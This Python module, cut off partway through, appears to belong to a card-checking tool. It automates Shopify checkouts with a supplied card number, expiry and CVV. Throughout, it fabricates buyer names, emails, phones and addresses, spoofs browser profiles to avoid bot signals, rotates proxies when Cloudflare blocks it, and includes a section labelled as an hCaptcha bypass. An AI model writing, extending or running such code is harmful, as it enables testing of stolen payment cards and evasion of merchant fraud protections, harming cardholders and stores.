"""
Core Card Processing Pipeline:
Contains the primary process_card(), _process_card_inner(), _throttled_process(),
and response builder functions.
"""
import asyncio
import aiohttp
import gc
import json
import logging
import os
import random
import re
import sys
import time
from typing import Optional, Tuple, Dict, Any, Union
from urllib.parse import urlparse

from engine.graphql import (
    QUERY_PROPOSAL_SHIPPING,
    QUERY_PROPOSAL_DELIVERY,
    MUTATION_SUBMIT,
    QUERY_POLL,
)
from engine.config import (
    _pick_browser_profile,
    book,
    pick_addr,
    generate_valid_phone,
    _get_alternate_phone,
    C2C,
    Utils,
    extract_between,
    get_exchange_rate,
    convert_to_usd,
    EXCHANGE_RATES,
    CURRENCY_SYMBOLS,
)
from engine.network import (
    parse_proxy,
    AiohttpCurlCffiSession,
    extract_session_token,
    is_captcha_required,
    make_graphql_request_with_captcha_handling,
    _get_site_semaphore,
    _PER_SITE_SEMAPHORES,
    _PER_SITE_LAST_SEEN,
    _PER_SITE_LOCK,
    _get_fallback_proxies,
    _rotate_fallback_proxy,
    _CURL_RETRY_ERRORS,
    get_global_connector,
)
from engine.discovery import (
    _VARIANT_CACHE,
    normalize_cache_key,
    fetch_products,
    extract_clean_response,
    prune_variant_cache,
)
from engine.tokenization import tokenize_card_shopify

logger = logging.getLogger("shopi_api.pipeline")

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, timeout_sec=40, check_only=False, uid=None, bin_country=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    
    site_url = site_url.strip()
    
    # Fix copy-paste errors where proxy or cc is appended to site_url
    if '@' in site_url or '|' in site_url:
        import re
        m = re.match(r'^(https?://[a-zA-Z0-9.-]+)', site_url)
        if m:
            clean_host = m.group(1)
            # Remove trailing numbers if they belong to a proxy port copy-paste like .co68:
            clean_host = re.sub(r'\d+$', '', clean_host)
            site_url = clean_host
    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    payment_identifier = None
    proxy = parse_proxy(proxy_str) if proxy_str else None
    checkpoint_data = None
    running_total = "0.00"

    logger.debug(f"[{cc}] Starting process_card for {site_url}...")

    # Per-site concurrency: wait for a slot on this specific store
    # Add a timeout so bulk runs don't hang indefinitely waiting for a semaphore slot.
    # If we can't acquire within (timeout_sec - 5)s, fail fast instead of blocking forever.
    site_domain = urlparse(ourl).netloc
    site_sem = await _get_site_semaphore(site_domain)
    sem_wait = max(10, timeout_sec - 5)
    try:
        acquired = await asyncio.wait_for(site_sem.acquire(), timeout=sem_wait)
    except asyncio.TimeoutError:
        return False, f"Request Timeout: site slot wait exceeded {sem_wait}s (too many concurrent requests)", "UNKNOWN", "0.00", "USD"
    try:
        return await _process_card_inner(cc, mes, ano, cvv, ourl, variant_id, proxy_str, timeout_sec, check_only, uid, bin_country)
    finally:
        site_sem.release()

async def _process_card_inner(cc, mes, ano, cvv, ourl, variant_id=None, proxy_str=None, timeout_sec=40, check_only=False, uid=None, bin_country=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    payment_identifier = None
    ourl = ourl.strip()
    proxy = parse_proxy(proxy_str) if proxy_str else None
    checkpoint_data = None
    cc = re.sub(r'\D', '', str(cc or ''))
    cvv = re.sub(r'\D', '', str(cvv or ''))
    mes = re.sub(r'\D', '', str(mes or ''))
    ano = re.sub(r'\D', '', str(ano or ''))

    try:
        # Pick a browser profile for this session — all headers must match
        _bp = _pick_browser_profile()
        
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'br, zstd, gzip, deflate',
            'Accept-Language': _bp.get('accept_language', 'en-US,en;q=0.9'),
            'Content-Type': 'application/json',
            'Origin': ourl,
            'Referer': ourl + '/',
            'User-Agent': _bp['ua'],
            'DNT': '1',
        }
        # Safari does NOT send sec-ch-ua headers — adding them is a bot signal
        if _bp.get('sec_ch_ua'):
            headers['sec-ch-ua'] = _bp['sec_ch_ua']
            headers['sec-ch-ua-mobile'] = _bp['sec_ch_ua_mobile']
            headers['sec-ch-ua-platform'] = _bp['sec_ch_ua_platform']


        if bin_country and bin_country.upper() in book:
            address_info = book[bin_country.upper()]
        else:
            address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]
        
        # 2. Country-Specific Phone Formatting (Clean digits, no spaces/hyphens to avoid pattern errors)
        phone = generate_valid_phone(country_code, address_info.get("phone", "2125550000"))
            
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)
        
        street = address_info.get("address1", "1201 N Market St")
        
        city = address_info.get("city", "Wilmington")
        state = address_info.get("zoneCode", "DE")
        s_zip = address_info.get("postalCode", "19801")
        if not s_zip:
            s_zip = "19801"
        
        # 3. Address 2 / APT Randomization
        address2_choices = [
            f"Apt {random.randint(1, 999)}",
            f"Suite {random.randint(100, 999)}",
            f"Unit {random.randint(1, 99)}",
            f"Room {random.randint(10, 99)}",
            f"Floor {random.randint(1, 5)}"
        ]
        address2 = random.choice(address2_choices)

        # 4. Cache variant_id with price-aware TTL
        #    Cache entry: (variant_id, timestamp, requires_shipping, currency, usd_price, cache_ttl)
        _cached_requires_shipping = None
        if not variant_id:
            import time
            now = time.time()
            cache_key = normalize_cache_key(ourl)
            cached = _VARIANT_CACHE.get(cache_key)
            fallback_variant_id = None
            fallback_requires_shipping = None
            fallback_currency = None
            fallback_usd_price = None
            if cached:
                _cache_ttl = cached[5] if len(cached) > 5 else 7200
                if (now - cached[1]) < _cache_ttl:
                    variant_id = cached[0]
                    _cached_requires_shipping = cached[2] if len(cached) > 2 else None
                    _cached_currency = cached[3] if len(cached) > 3 else "USD"
                    currency = _cached_currency
                    _cached_usd_price = cached[4] if len(cached) > 4 else None
                    logger.debug(f"[CACHE] Hit for cache_key: {cache_key} -> variant_id: {variant_id}, usd_price: {_cached_usd_price}, ttl: {_cache_ttl}s")
                else:
                    logger.debug(f"[CACHE] Expired (TTL {_cache_ttl}s) for {cache_key}, keeping as fallback...")
                    fallback_variant_id = cached[0]
                    fallback_requires_shipping = cached[2] if len(cached) > 2 else None
                    fallback_currency = cached[3] if len(cached) > 3 else "USD"
                    fallback_usd_price = cached[4] if len(cached) > 4 else None
            if not variant_id:
                logger.debug(f"[CACHE] Miss or Expired for cache_key: {cache_key}. Fetching products...")
                info = await fetch_products(ourl, proxy_str, timeout_sec=min(20, timeout_sec))
                if isinstance(info, tuple) and info[0] is False:
                    if fallback_variant_id:
                        logger.debug(f"[CACHE] Fetch failed, falling back to expired variant: {fallback_variant_id}")
                        variant_id = fallback_variant_id
                        _cached_requires_shipping = fallback_requires_shipping
                        currency = fallback_currency or "USD"
                    else:
                        return False, info[1], gateway, total_price, currency
                else:
                    variant_id = info['variant_id']
                    _cached_requires_shipping = info.get('requires_shipping', True)
                    _cached_currency = info.get('currency', 'USD')
                    currency = _cached_currency
                    prune_variant_cache()

        connector = get_global_connector()
        # Remove aggressive 15s socket timeout. Allow the full timeout_sec (40s) for checkout flows.
        timeout = aiohttp.ClientTimeout(total=timeout_sec, sock_read=timeout_sec)
        
        async with AiohttpCurlCffiSession(connector=connector, connector_owner=False, timeout=timeout, browser_profile=_bp) as session:
            url = ourl
            cart = url + '/cart/add.js'
            checkout = url + '/checkout/'

            # Cart request automatically establishes all required Shopify session cookies (_shopify_y, _shopify_s, cart)
            # without wasting 6-7 seconds downloading the homepage.

            cart_headers = {
                **headers,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json, text/javascript',
                'X-Requested-With': 'XMLHttpRequest',
            }
            cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
            await cart_resp.read()
            
            if cart_resp.status != 200:
                cart_headers_alt = {
                    **headers,
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
                try:
                    # Clean the variant ID to extract only digits in case it's a gid:// string
                    import re as _re
                    vid_clean = _re.sub(r'\D', '', str(variant_id))
                    vid_int = int(vid_clean) if vid_clean else int(variant_id)
                except Exception:
                    vid_int = variant_id
                    
                cart_data = {'items': [{'id': vid_int, 'quantity': 1}]}
                cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy)
                await cart_resp.read()
            
            if cart_resp.status != 200:
                # Invalidate cache only if it is a permanent site error (e.g. 404/422, sold out)
                # Keep cache on connection timeouts/rate limits/Cloudflare blocks
                try:
                    text_lower = (await cart_resp.text()).lower()
                except Exception:
                    text_lower = ""
                is_permanent = cart_resp.status in (404, 422) or any(w in text_lower for w in ["sold out", "not found", "unavailable", "exist"])
                is_server_error = cart_resp.status >= 500
                if is_permanent:
                    cache_key = normalize_cache_key(ourl)
                    _VARIANT_CACHE.pop(cache_key, None)
                    # Try fetching a fresh variant and retry the cart once
                    is_sold_out = any(w in text_lower for w in ["sold out", "not found", "unavailable"])
                    if is_sold_out:
                        print(f"[CART] Variant {variant_id} sold out / unavailable on {ourl}, fetching fresh...")
                        fresh_info = await fetch_products(ourl, proxy_str, timeout_sec=min(15, timeout_sec))
                        if isinstance(fresh_info, dict) and fresh_info.get('variant_id'):
                            variant_id = fresh_info['variant_id']
                            fresh_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
                            await fresh_resp.read()
                            if fresh_resp.status == 200:
                                await asyncio.sleep(random.uniform(0.8, 2.0))
                            else:
                                return False, f"Cart failed with status {cart_resp.status} (sold out, fresh variant also failed)", gateway, total_price, currency
                        else:
                            return False, "No valid products found (all sold out?)", gateway, total_price, currency
                if is_server_error:
                    # 5xx errors are transient — return as retryable proxy/site error
                    return False, f"Proxy Error: Cart server error {cart_resp.status}", gateway, total_price, currency
                if cart_resp.status != 200:
                    return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency


            # Minimal delay between cart add and checkout navigation
            await asyncio.sleep(0.05)

            checkout_headers = {
                **headers,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'br, zstd, gzip, deflate',
                'Upgrade-Insecure-Requests': '1',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1'
            }
            response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
            checkout_url = str(response.url)

            if 'shop.app' in checkout_url or 'shop-pay' in checkout_url or 'shoppay' in checkout_url:
                return False, "Shop Pay redirection (site not supported)", gateway, total_price, currency

            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

            text = await response.text()
            sst = extract_session_token(text, response.headers)
            
            if 'login' in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency

            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
            stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
            
            merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                    extract_between(text, 'ProductVariantMerchandise/', '&q') or \
                    extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
            if not merch:
                merch = str(variant_id)
            
            currency = 'USD'
            if 'currencyCode&quot;:&quot;' in text:
                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or 'USD'
                
            # Switch to the store's local country address based on detected currency or site country.
            # This ensures NZD stores get NZ addresses, AUD stores get AU, HKD gets HK, etc.
            site_cc = C2C.get(currency.upper())
            if not site_cc:
                site_cc_match = re.search(r'Shopify\.country\s*=\s*["\']([A-Z]{2})["\']', text)
                if site_cc_match:
                    site_cc = site_cc_match.group(1)
            if not site_cc:
                site_cc = extract_between(text, 'countryCode&quot;:&quot;', '&quot;') or extract_between(text, '"countryCode":"', '"')
            
            if site_cc and len(site_cc) == 2 and site_cc.upper() != country_code:
                new_cc = site_cc.upper()
                if new_cc in book:
                    address_info = book[new_cc]
                    country_code = address_info["countryCode"]
                    phone = generate_valid_phone(country_code, address_info.get("phone", ""))
                    street = address_info.get("address1", "1201 N Market St")
                    city = address_info.get("city", "Wilmington")
                    state = address_info.get("zoneCode", "DE")
                    s_zip = address_info.get("postalCode", "19801")
                else:
                    country_code = new_cc
                    state = ""
                    s_zip = ""
                    phone = generate_valid_phone(country_code)

            subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
                     extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else "0.01"
                
            taxes_included = False
            if 'taxesIncluded&quot;:true' in text or '"taxesIncluded":true' in text:
                taxes_included = True

            requires_shipping = True
            if 'requiresShipping&quot;:false' in text or '"requiresShipping":false' in text:
                requires_shipping = False

            unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
            
            build_id = None
            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped_text)
            if build_match:
                build_id = build_match.group(1)
            
            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace('&quot;', '').strip('"')
            
            ident_sig = None
            ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped_text)
            if ident_match:
                ident_sig = ident_match.group(1)
            
            if not sst:
                print(f"[SESSION TOKEN FAIL] status={response.status} url={checkout_url} text_len={len(text)} headers={dict(response.headers)}")
                # Enable proxy rotation retry on Cloudflare/403 blocks to increase success rates
                await asyncio.sleep(random.uniform(0.5, 1.2))
                try:
                    retry_proxy = proxy
                    fallbacks = _get_fallback_proxies(uid)
                    if fallbacks:
                        valid_fallbacks = [fb for fb in fallbacks if fb != proxy]
                        if valid_fallbacks:
                            retry_proxy = random.choice(valid_fallbacks)
                        else:
                            retry_proxy = random.choice(fallbacks)
                        print(f"[SESSION TOKEN RETRY] Rotating proxy from {proxy} to {retry_proxy}")
                    
                    cart_resp2 = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=retry_proxy)
                    await cart_resp2.read()
                    response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=retry_proxy)
                    checkout_url = str(response.url)
                    text = await response.text()
                    sst = extract_session_token(text, response.headers)
                    if sst:
                        proxy = retry_proxy  # Update proxy to the rotated working one
                except Exception as e:
                    print(f"[SESSION TOKEN RETRY] Failed during retry: {e}")
                    pass
                if not sst:
                    is_cf = "cloudflare" in text.lower() or "challenge" in text.lower() or (response is not None and response.status == 403)
                    err_msg = "Proxy Error: Cloudflare block on checkout" if is_cf else "Proxy Error: Failed to get session token"
                    return False, err_msg, gateway, total_price, currency
            
            headers.update({
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
                'x-checkout-one-session-token': sst,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            })
            if build_id:
                headers['x-checkout-web-build-id'] = build_id
                headers['x-checkout-web-deploy-stage'] = 'production'
                headers['x-checkout-web-server-handling'] = 'fast'
                headers['x-checkout-web-server-rendering'] = 'yes'
            if source_token:
                headers['x-checkout-web-source-id'] = source_token

            params = {'operationName': 'Proposal'}
            
            _req_ship = requires_shipping
            if _cached_requires_shipping is not None:
                _req_ship = bool(_cached_requires_shipping)

            json_data = {
                'query': QUERY_PROPOSAL_SHIPPING,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [] if not _req_ship else [{
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True}
                                },
                                'options': {}
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True
                        }],
                        'noDeliveryRequired': [{'stableId': stableId or '1'}] if not _req_ship else [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'deliveryExpectations': {'deliveryExpectationLines': []},
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': '', 'city': '', 'countryCode': country_code,
                                'lastName': '', 'zoneCode': state, 'phone': ''
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'countryCode': country_code},
                        'rememberMe': False
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'operationName': 'Proposal'
            }

            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
            
            # Minimal delay before first GraphQL request
            await asyncio.sleep(0.02)
            
            captcha_retries = 0  # guard against infinite captcha loops
            for i in range(3):
                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
                )
                if not response:
                    # Transient network failure — retry up to 2 more times
                    if i < 2:
                        await asyncio.sleep(0.5 * (i + 1))
                        continue
                    break
                if is_captcha_required(resp_text):
                    captcha_retries += 1
                    if captcha_retries > 2:
                        # Exhausted captcha bypass attempts — treat as site error
                        return False, "Proxy Error: security check", gateway, total_price, currency
                    # Auto-rotate proxy and retry
                    new_proxy = _rotate_fallback_proxy(proxy)
                    if new_proxy and new_proxy != proxy:
                        proxy = new_proxy
                        headers['Origin'] = ourl
                    await asyncio.sleep(1.5)
                    continue
                    
                try:
                    resp_json = json.loads(resp_text)
                except json.JSONDecodeError as e:
                    return False, f"Invalid JSON response: {str(e)}", gateway, total_price, currency
                    
                if 'errors' in resp_json:
                    logger.debug("[PROPOSAL] Errors received: %s", resp_text[:400])
                    errors = resp_json.get('errors', [])
                    # Auto-recover if error is phone pattern mismatch
                    is_phone_err = any('phone' in (str(e.get('message', '')) + str(e.get('code', ''))).lower() for e in errors)
                    if is_phone_err and i < 4:
                        phone = _get_alternate_phone(phone, country_code, attempt=i+1)
                        try:
                            for dl in json_data['variables']['delivery'].get('deliveryLines', []):
                                if 'partialStreetAddress' in dl.get('destination', {}):
                                    dl['destination']['partialStreetAddress']['phone'] = phone
                                if 'streetAddress' in dl.get('destination', {}):
                                    dl['destination']['streetAddress']['phone'] = phone
                        except Exception:
                            pass
                        await asyncio.sleep(0.2)
                        continue
                    error_msgs = [e.get('message', str(e)) for e in errors[:3]]
                    return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency

                try:
                    session_data = (resp_json.get('data') or {}).get('session') or {}
                    if not session_data:
                        result = {}
                    else:
                        result = (session_data.get('negotiate') or {}).get('result') or {}
                    result_type = result.get('__typename', '')
                    if result_type == 'Throttled':
                        queueToken = result.get('queueToken') or queueToken
                        json_data['variables']['queueToken'] = queueToken
                        poll_after = result.get('pollAfter', 2.0)
                        if i < 7:
                            await asyncio.sleep(float(poll_after))
                            continue
                        else:
                            return False, "Rate Limit (Throttled)", gateway, total_price, currency
                except Exception:
                    pass
                
                try:
                    seller_proposal = ((((resp_json.get('data') or {}).get('session') or {}).get('negotiate') or {}).get('result') or {}).get('sellerProposal') or {}
                    is_shipping_required = seller_proposal.get('isShippingRequired', True)
                    res_type = (seller_proposal.get('delivery') or {}).get('__typename')

                    # ── FREE hCaptcha Bypass ────────────────────────────────────────
                    # Shopify returns: sellerProposal.captcha = {provider, sitekey, challenge, token}
                    captcha_field = seller_proposal.get('captcha') or {}
                    if captcha_field and captcha_field.get('__typename') == 'Captcha' and captcha_field.get('sitekey'):
                        captcha_token = captcha_field.get('token')
                        captcha_provider = captcha_field.get('provider', 'hcaptcha')

                        if captcha_token:
                            # Layer 1: Shopify pre-issued a token — pass it straight back.
                            # Only try this once; if the same token keeps coming back, stop.
                            captcha_retries += 1
                            if captcha_retries <= 2:
                                json_data['variables']['captcha'] = {
                                    'provider': captcha_provider,
                                    'token': captcha_token
                                }
                                await asyncio.sleep(0.5)
                                continue

                        # Layer 2: No usable token — rotate proxy and let the outer
                        # retry mechanism (check_shopify_card_with_retry) restart the
                        # full checkout on a fresh site. Do NOT try to restart here
                        # mid-session; the sst/queueToken are already bound to the old session.
                        captcha_retries += 1
                        if captcha_retries <= 2:
                            new_proxy = _rotate_fallback_proxy(proxy)
                            if new_proxy and new_proxy != proxy:
                                proxy = new_proxy
                            await asyncio.sleep(2.0)
                            json_data['variables'].pop('captcha', None)
                            continue
                        return False, "Proxy Error: hCaptcha", gateway, total_price, currency

                    # ── End Bypass ──────────────────────────────────────────────────

                    # Break as soon as delivery terms are resolved (filled/unavailable) or shipping isn't needed
                    if not is_shipping_required or res_type in ('FilledDeliveryTerms', 'UnavailableTerms') or res_type != 'PendingTerms':
                        break
                except Exception:
                    pass

                # Only sleep if we're actually still polling
                poll_after_ms = result.get('pollAfter', 0.15) if result_type == 'Throttled' else 0.15
                await asyncio.sleep(float(poll_after_ms))
            
            if not response:
                return False, f"Proxy Error: Request failed: {resp_text}", gateway, total_price, currency


            try:
                if 'data' not in resp_json:
                    return False, "No data in proposal response", gateway, total_price, currency
                
                session_data = resp_json['data'].get('session')
                if session_data is None:
                    return False, "Session is null", gateway, total_price, currency
                
                negotiate = session_data.get('negotiate')
                if negotiate is None:
                    return False, "Negotiate returned null", gateway, total_price, currency
                
                result = negotiate.get('result')
                if result is None:
                    return False, "Result is null", gateway, total_price, currency
                
                result_type = result.get('__typename', 'Unknown')
                
                if result_type == 'CheckpointDenied':
                    return False, "Checkpoint Denied", gateway, total_price, currency

                if result_type == 'NegotiationResultFailed':
                    return False, "Negotiation failed", gateway, total_price, currency
                
                checkpoint_data = result.get('checkpointData') or checkpoint_data
                queueToken = result.get('queueToken') or queueToken
                
                seller_proposal = result.get('sellerProposal')
                if seller_proposal is None:
                    return False, "Seller proposal is null", gateway, total_price, currency
                
                delivery_data = seller_proposal.get('delivery')
                running_total_data = seller_proposal.get('runningTotal')
                total_data = seller_proposal.get('total')
                
                if not running_total_data and not total_data:
                    return False, "No runningTotal in sellerProposal", gateway, total_price, currency
                
                if running_total_data and running_total_data.get('value'):
                    running_total = str(running_total_data['value'].get('amount', '0.00'))
                    proposal_currency = running_total_data['value'].get('currencyCode')
                    if proposal_currency:
                        currency = proposal_currency.upper()

                if total_data and total_data.get('value'):
                    tot_amt = total_data['value'].get('amount')
                    if tot_amt:
                        running_total = str(tot_amt)
                    tot_curr = total_data['value'].get('currencyCode')
                    if tot_curr:
                        currency = tot_curr.upper()
                
                try:
                    merch_data = seller_proposal.get('merchandise', {}).get('merchandiseLines', [])
                    if merch_data and len(merch_data) > 0:
                        merch_amt = merch_data[0].get('totalAmount', {}).get('value', {}).get('amount')
                        if merch_amt is not None:
                            subtotal = str(merch_amt)
                except Exception:
                    pass
                
            except (KeyError, TypeError) as e:
                return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency

            is_shipping_required = seller_proposal.get('isShippingRequired', True)
            # If the cached product is digital, trust that flag over the API value
            if _cached_requires_shipping is False:
                is_shipping_required = False

            if not delivery_data:
                return False, "No delivery data in proposal", gateway, total_price, currency
            
            delivery_type = delivery_data.get('__typename', '')
            
            pending_attempts = 0
            while delivery_type == 'PendingTerms' and pending_attempts < 5:
                pending_attempts += 1
                poll_delay_ms = delivery_data.get('pollDelay', 250)
                await asyncio.sleep(min(poll_delay_ms / 1000.0, 0.25))
                response, resp_text, _ = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
                )
                if response:
                    try:
                        retry_json = json.loads(resp_text)
                        retry_seller = retry_json.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
                        if retry_seller:
                            delivery_data = retry_seller.get('delivery', delivery_data)
                            running_total_data = retry_seller.get('runningTotal', running_total_data)
                            if running_total_data and running_total_data.get('__typename') != 'PendingTerms':
                                if 'value' in running_total_data and 'amount' in running_total_data['value']:
                                    running_total = running_total_data['value']['amount']
                            seller_proposal = retry_seller
                    except Exception:
                        pass
                delivery_type = delivery_data.get('__typename', '') if delivery_data else ''

            delivery_line_id = ''
            
            
            has_delivery_lines = False
            has_destination = True
            if delivery_type == 'PendingTerms':
                delivery_strategy = ''
                shipping_amount = 0.0
                shipping_amount_str = '0.00'
                # IMPORTANT: Extract the delivery_line_id from PendingTerms as well
                delivery_lines = delivery_data.get('deliveryLines', [])
                if delivery_lines and len(delivery_lines) > 0:
                    has_delivery_lines = True
                    delivery_line_id = delivery_lines[0].get('id', '')
                    if delivery_lines[0].get('destinationAddress') is None:
                        has_destination = False
            # ── SHIPPING STRATEGY SELECTION ─────────────────────────────────
            # Prefer cheapest rate; accept $0 if all rates are free.
            def _pick_best_strategy(strategies: list) -> tuple:
                """Returns (handle, amount_str, amount_float, name)"""
                if not strategies:
                    return '', '0.00', 0.0, ''
                def _price(s):
                    try:
                        return float((s.get('amount') or {}).get('value', {}).get('amount', '0'))
                    except:
                        return 999999.0
                sorted_strats = sorted(strategies, key=_price)
                best = sorted_strats[0]
                handle = best.get('handle', '')
                amt_str = ((best.get('amount') or {}).get('value') or {}).get('amount', '0')
                try:
                    amt = float(amt_str)
                except:
                    amt = 0.0
                name = best.get('name') or best.get('title') or ''
                return handle, amt_str, amt, name

            if delivery_type == 'FilledDeliveryTerms':
                delivery_lines = delivery_data.get('deliveryLines', [])
                if delivery_lines and len(delivery_lines) > 0:
                    has_delivery_lines = True
                    delivery_line_id = delivery_lines[0].get('id', '')
                    if delivery_lines[0].get('destinationAddress') is None:
                        has_destination = False
                    available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    delivery_strategy, shipping_amount_str, shipping_amount, shipping_name = _pick_best_strategy(available_strategies)
                else:
                    delivery_strategy = ''
                    shipping_amount = 0.0
                    shipping_amount_str = '0.00'
                    shipping_name = ''
            else:
                delivery_strategy = ''
                shipping_amount = 0.0
                shipping_amount_str = '0.00'
                shipping_name = ''

            
            # ── TAX EXTRACTION (handle included-tax regions like EU/AU/UK) ────
            try:
                tax_data = seller_proposal.get('tax', {})
                tax_typename = tax_data.get('__typename', '')
                if tax_typename == 'FilledTaxTerms':
                    tax_amount_str = (tax_data.get('totalTaxAmount') or {}).get('value', {}).get('amount', '0')
                    tax_amount = float(tax_amount_str)
                    # Detect tax-included regions: if tax is included in the price,
                    # totalTaxAmount is informational only and NOT added on top
                    tax_lines = tax_data.get('totalTaxLines') or []
                    tax_included = any(
                        line.get('taxIncluded') or line.get('included')
                        for line in tax_lines
                    ) if tax_lines else tax_data.get('taxIncluded', False)
                    if tax_included:
                        # Tax is INCLUDED in the product price — don't double-count
                        tax_amount_str = '0.00'
                        tax_amount = 0.0
                elif tax_typename == 'PendingTaxTerms':
                    # Tax not yet resolved — will be in 2nd proposal
                    tax_amount = 0.0
                    tax_amount_str = '0.00'
                else:
                    tax_amount = 0.0
                    tax_amount_str = '0.00'
            except Exception:
                tax_amount = 0.0
                tax_amount_str = '0.00'

            # ── DISCOUNT EXTRACTION ──────────────────────────────────
            discount_amount = 0.0
            discount_amount_str = '0.00'
            try:
                disc_data = seller_proposal.get('discounts') or {}
                disc_lines = disc_data.get('discountLines') or []
                for dl in disc_lines:
                    disc_amt = ((dl.get('amount') or {}).get('value') or {}).get('amount', '0')
                    try:
                        discount_amount += float(disc_amt)
                    except:
                        pass
                if discount_amount > 0:
                    discount_amount_str = f"{discount_amount:.2f}"
            except Exception:
                pass

            # ── GATEWAY + PRICE DETECTION ─────────────────────────────────────
            # Known non-CC wallet handles/names to skip
            _WALLET_SKIP = {
                'paypal', 'apple_pay', 'apple-pay', 'applepay',
                'google_pay', 'google-pay', 'googlepay',
                'shop_pay', 'shop-pay', 'shoppay', 'shopify-pay',
                'cash_on_delivery', 'cod', 'afterpay', 'klarna',
                'affirm', 'sezzle', 'zip', 'laybuy', 'openpay',
            }
